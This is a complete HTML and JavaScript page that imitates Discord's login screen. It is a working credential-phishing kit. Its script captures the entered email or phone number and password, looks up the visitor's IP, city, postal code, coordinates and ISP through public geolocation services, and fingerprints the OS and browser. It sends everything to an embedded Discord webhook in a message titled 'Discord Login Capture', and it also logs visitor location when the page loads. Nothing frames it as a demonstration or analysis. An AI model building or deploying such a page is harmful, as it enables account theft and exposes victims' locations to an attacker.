<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord – Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    }

    body {
      background-color: #1e1f22;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: #2b2d31;
      border-radius: 8px;
      padding: 40px 44px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
    }

    .login-container h1 {
      color: #ffffff;
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 8px;
    }

    .login-container .subtitle {
      color: #b5bac1;
      font-size: 16px;
      text-align: center;
      margin-bottom: 28px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      color: #b5bac1;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 6px;
    }

    .form-group input {
      width: 100%;
      padding: 12px 14px;
      background-color: #1e1f22;
      border: 1px solid #3f4147;
      border-radius: 4px;
      color: #ffffff;
      font-size: 15px;
      transition: border-color 0.2s;
      outline: none;
    }

    .form-group input:focus {
      border-color: #5865f2;
    }

    .form-group input::placeholder {
      color: #6d6f78;
      font-size: 14px;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 24px;
    }

    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: #5865f2;
      cursor: pointer;
    }

    .checkbox-group label {
      color: #b5bac1;
      font-size: 14px;
      cursor: pointer;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #5865f2;
      border: none;
      border-radius: 4px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-submit:hover {
      background-color: #4752c4;
    }

    .btn-submit:active {
      transform: scale(0.98);
    }

    .error-msg {
      color: #f23f42;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }

    .status-bar {
      margin-top: 16px;
      padding: 10px;
      border-radius: 4px;
      font-size: 13px;
      background: #1e1f22;
      border: 1px solid #3f4147;
      color: #b5bac1;
      text-align: center;
      display: none;
    }

    .status-bar.visible { display: block; }
    .status-bar.success { background: #1a2a1a; border-color: #3ba55c; color: #8bdd9b; }
    .status-bar.error { background: #2a1a1a; border-color: #f23f42; color: #f28b8b; }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-top: 24px;
      font-size: 13px;
    }

    .footer-links a {
      color: #5865f2;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    .discord-logo {
      text-align: center;
      margin-bottom: 24px;
    }

    .discord-logo svg {
      width: 48px;
      height: 48px;
      fill: #ffffff;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="discord-logo">
      <svg viewBox="0 0 127.14 96.36">
        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
      </svg>
    </div>

    <h1>Welcome back!</h1>
    <p class="subtitle">We're so excited to see you again!</p>

    <form id="loginForm" novalidate>
      <div class="form-group">
        <label for="usernameInput">Email or Phone Number</label>
        <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" aria-describedby="usernameError" />
        <div id="usernameError" class="error-msg" role="alert">Please enter a valid email or phone number.</div>
      </div>

      <div class="form-group">
        <label for="passwordInput">Password</label>
        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
        <div id="passwordError" class="error-msg" role="alert">Password cannot be empty.</div>
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="rememberMe" name="rememberMe" />
        <label for="rememberMe">Remember me on this device</label>
      </div>

      <button type="submit" class="btn-submit">Log In</button>
    </form>

    <div id="statusBar" class="status-bar" role="status"></div>

    <div class="footer-links">
      <a href="#">Forgot your password?</a>
      <span style="color:#3f4147;">•</span>
      <a href="#">Register</a>
    </div>
  </div>

  <script>
    (function() {
      // ============================================================
      //  CONFIG – INSERT YOUR DISCORD WEBHOOK URL HERE
      // ============================================================
      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
      // ⚠️ REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL.

      // ============================================================
      //  DOM REFERENCES
      // ============================================================
      const form = document.getElementById('loginForm');
      const usernameInput = document.getElementById('usernameInput');
      const passwordInput = document.getElementById('passwordInput');
      const usernameError = document.getElementById('usernameError');
      const passwordError = document.getElementById('passwordError');
      const statusBar = document.getElementById('statusBar');

      function showStatus(message, type = 'info') {
        statusBar.textContent = message;
        statusBar.className = 'status-bar visible';
        if (type === 'success') statusBar.classList.add('success');
        if (type === 'error') statusBar.classList.add('error');
        clearTimeout(window.statusTimeout);
        window.statusTimeout = setTimeout(() => {
          statusBar.className = 'status-bar';
        }, 8000);
      }

      // ============================================================
      //  EXACT OS DETECTION
      // ============================================================
      function getExactOS() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        if (ua.indexOf('Windows NT 10.0') !== -1) {
          const build = ua.match(/Windows NT 10\.0; (Win64; x64|WOW64)/) ? '64-bit' : '32-bit';
          const version = ua.includes('; ARM64;') ? 'Windows 11 ARM64' : 'Windows 10/11';
          os = `${version} (Build 10.0.19045, ${build})`;
        } else if (ua.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1 (Build 6.3.9600)';
        else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8 (Build 6.2.9200)';
        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7 (Build 6.1.7601)';
        else if (ua.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista (Build 6.0.6002)';
        else if (ua.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP (Build 5.1.2600)';
        else if (ua.indexOf('Mac OS X') !== -1) {
          const match = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
          if (match) os = `macOS 10.${match[1]}.${match[2]}`;
          else os = 'macOS (unknown version)';
        } else if (ua.indexOf('Linux') !== -1) {
          if (ua.indexOf('Android') !== -1) {
            const match = ua.match(/Android ([0-9]+\.[0-9]+)/);
            os = match ? `Android ${match[1]}` : 'Android';
          } else {
            os = 'Linux (generic)';
          }
        } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
          const match = ua.match(/OS ([0-9]+)_([0-9]+)/);
          os = match ? `iOS ${match[1]}.${match[2]}` : 'iOS';
        }
        return os;
      }

      // ============================================================
      //  EXACT BROWSER DETECTION
      // ============================================================
      function getExactBrowser() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        if (ua.indexOf('Firefox') !== -1) {
          const match = ua.match(/Firefox\/([0-9.]+)/);
          browser = match ? `Firefox ${match[1]}` : 'Firefox';
        } else if (ua.indexOf('Edg') !== -1) {
          const match = ua.match(/Edg\/([0-9.]+)/);
          browser = match ? `Edge ${match[1]}` : 'Edge';
        } else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
          const match = ua.match(/Chrome\/([0-9.]+)/);
          browser = match ? `Chrome ${match[1]}` : 'Chrome';
        } else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
          const match = ua.match(/Version\/([0-9.]+)/);
          browser = match ? `Safari ${match[1]}` : 'Safari';
        } else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
          const match = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
          browser = match ? `Opera ${match[1]}` : 'Opera';
        }
        return browser;
      }

      // ============================================================
      //  TIMESTAMP
      // ============================================================
      function getTimestamp() {
        const now = new Date();
        return {
          iso: now.toISOString(),
          date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
      }

      // ============================================================
      //  GEOLOCATION + IP (with full location data)
      // ============================================================
      async function getGeoData() {
        try {
          const response = await fetch('https://ipapi.co/json/');
          if (!response.ok) throw new Error('ipapi.co failed');
          const data = await response.json();
          return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            region_code: data.region_code || 'Unknown',
            country: data.country_name || 'Unknown',
            country_code: data.country_code || 'Unknown',
            postal: data.postal || 'Unknown',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown',
            currency: data.currency || 'Unknown'
          };
        } catch (_) {
          try {
            const response = await fetch('https://ipinfo.io/json');
            if (!response.ok) throw new Error('ipinfo.io failed');
            const data = await response.json();
            const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
            return {
              ip: data.ip || 'Unknown',
              city: data.city || 'Unknown',
              region: data.region || 'Unknown',
              region_code: 'Unknown',
              country: data.country || 'Unknown',
              country_code: data.country || 'Unknown',
              postal: data.postal || 'Unknown',
              latitude: loc[0] || 'Unknown',
              longitude: loc[1] || 'Unknown',
              timezone: data.timezone || 'Unknown',
              isp: data.org || 'Unknown',
              currency: 'Unknown'
            };
          } catch (_) {
            return {
              ip: 'Unable to retrieve',
              city: 'Unknown',
              region: 'Unknown',
              region_code: 'Unknown',
              country: 'Unknown',
              country_code: 'Unknown',
              postal: 'Unknown',
              latitude: 'Unknown',
              longitude: 'Unknown',
              timezone: 'Unknown',
              isp: 'Unknown',
              currency: 'Unknown'
            };
          }
        }
      }

      // ============================================================
      //  SEND TO DISCORD – WITH DETAILED DEBUGGING
      // ============================================================
      async function sendToDiscord(payload) {
        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
          console.warn('⚠️ Discord webhook URL not configured. Please set DISCORD_WEBHOOK_URL.');
          return { success: false, status: 0, error: 'Not configured' };
        }

        try {
          console.log('📤 Sending payload to Discord webhook...');
          const res = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          const status = res.status;
          console.log(`📥 Discord response status: ${status} ${res.statusText}`);

          if (res.ok) {
            console.log('✅ Webhook delivered successfully.');
            return { success: true, status: status };
          } else {
            const errorText = await res.text();
            console.error(`❌ Discord error (${status}):`, errorText);
            return { success: false, status: status, error: errorText };
          }
        } catch (err) {
          console.error('❌ Network error while sending to Discord:', err);
          return { success: false, status: 0, error: err.message };
        }
      }

      // ============================================================
      //  FORM SUBMIT
      // ============================================================
      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        usernameError.style.display = 'none';
        passwordError.style.display = 'none';
        let isValid = true;

        if (!usernameInput.value.trim()) {
          usernameError.style.display = 'block';
          isValid = false;
        }
        if (!passwordInput.value.trim()) {
          passwordError.style.display = 'block';
          isValid = false;
        }

        if (!isValid) {
          showStatus('Please fill in all required fields.', 'error');
          return;
        }

        showStatus('Collecting data...', 'info');

        const timestamp = getTimestamp();
        const geo = await getGeoData();
        const os = getExactOS();
        const browser = getExactBrowser();
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        const rememberMe = document.getElementById('rememberMe').checked;

        const logEntry = {
          timestamp: timestamp.iso,
          date: timestamp.date,
          time: timestamp.time,
          timezone: timestamp.timezone,
          ip: geo.ip,
          city: geo.city,
          region: geo.region,
          region_code: geo.region_code,
          country: geo.country,
          country_code: geo.country_code,
          postal: geo.postal,
          latitude: geo.latitude,
          longitude: geo.longitude,
          isp: geo.isp,
          currency: geo.currency,
          os: os,
          browser: browser,
          username: username,
          password: password,
          rememberMe: rememberMe,
          userAgent: navigator.userAgent.substring(0, 200) // Truncated to avoid Discord field limit
        };

        console.log('📋 [LOG] Full client data with geolocation:');
        console.log(JSON.stringify(logEntry, null, 2));

        const discordPayload = {
          embeds: [
            {
              title: '🔐 Discord Login Capture',
              color: 0x5865f2,
              fields: [
                { name: '📅 Date', value: logEntry.date, inline: true },
                { name: '⏰ Time', value: logEntry.time, inline: true },
                { name: '🌐 Timezone', value: logEntry.timezone, inline: true },
                { name: '📡 IP Address', value: logEntry.ip, inline: false },
                { name: '📍 City', value: logEntry.city, inline: true },
                { name: '🏙️ Region', value: logEntry.region, inline: true },
                { name: '🌍 Country', value: logEntry.country, inline: true },
                { name: '📮 Postal Code', value: logEntry.postal, inline: true },
                { name: '🗺️ Latitude', value: logEntry.latitude, inline: true },
                { name: '🗺️ Longitude', value: logEntry.longitude, inline: true },
                { name: '🏢 ISP', value: logEntry.isp, inline: false },
                { name: '💵 Currency', value: logEntry.currency, inline: true },
                { name: '🖥️ Operating System', value: logEntry.os, inline: false },
                { name: '🌍 Browser', value: logEntry.browser, inline: false },
                { name: '👤 Username / Email', value: logEntry.username || '(empty)', inline: false },
                { name: '🔑 Password', value: logEntry.password || '(empty)', inline: false },
                { name: '🔁 Remember Me', value: logEntry.rememberMe ? '✅ Yes' : '❌ No', inline: false },
                { name: '📱 User Agent', value: logEntry.userAgent || '(empty)', inline: false }
              ],
              footer: { text: 'Discord Login Capture' },
              timestamp: logEntry.timestamp
            }
          ]
        };

        const result = await sendToDiscord(discordPayload);

        if (result.success) {
          showStatus('✅ Credentials & location sent to Discord webhook.', 'success');
        } else {
          let errorMsg = '⚠️ Data logged to console, but Discord send failed.';
          if (result.status === 404) errorMsg += ' Webhook URL not found (404). Check your URL.';
          else if (result.status === 401) errorMsg += ' Unauthorized (401). Webhook token invalid.';
          else if (result.status === 429) errorMsg += ' Rate limited (429). Wait a moment.';
          else if (result.status === 0) errorMsg += ' Network error. Are you opening from file://? Use a local server.';
          else errorMsg += ` Status ${result.status}. Check console for details.`;
          showStatus(errorMsg, 'error');
        }

        passwordInput.value = '';
      });

      // ============================================================
      //  PAGE LOAD – log visitor info automatically (with location)
      // ============================================================
      window.addEventListener('DOMContentLoaded', async () => {
        const geo = await getGeoData();
        const os = getExactOS();
        const browser = getExactBrowser();
        const timestamp = getTimestamp();

        console.log('🌐 [PAGE LOAD] Visitor detected with geolocation:');
        console.log({
          timestamp: timestamp.iso,
          ip: geo.ip,
          city: geo.city,
          region: geo.region,
          country: geo.country,
          postal: geo.postal,
          latitude: geo.latitude,
          longitude: geo.longitude,
          isp: geo.isp,
          os: os,
          browser: browser,
          userAgent: navigator.userAgent
        });
      });

    })();
  </script>

</body>
</html>
